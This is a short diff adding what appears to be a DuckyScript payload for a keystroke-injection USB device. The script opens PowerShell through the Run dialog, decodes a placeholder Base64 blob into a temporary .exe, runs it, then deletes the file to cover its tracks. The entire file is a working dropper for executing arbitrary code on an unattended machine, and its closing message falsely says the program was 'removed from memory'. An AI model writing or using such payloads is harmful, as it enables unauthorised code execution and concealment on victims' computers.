@@ -1,0 +1,9 @@
+﻿GUI r
+DELAY 1
+STRING powershell
+ENTER
+DELAY 1
+STRING $Base64EncodedString = "YourBase64StringHere"
+ENTER
+STRING $ExecutableBytes = [Convert]::FromBase64String($Base64EncodedString);$ExecutablePath = [System.IO.Path]::GetTempFileName() + ".exe";[System.IO.File]::WriteAllBytes($ExecutablePath, $ExecutableBytes);Start-Process $ExecutablePath;[System.IO.File]::Delete($ExecutablePath);Write-Host "Executable has been run and removed from memory.";exit
+ENTER
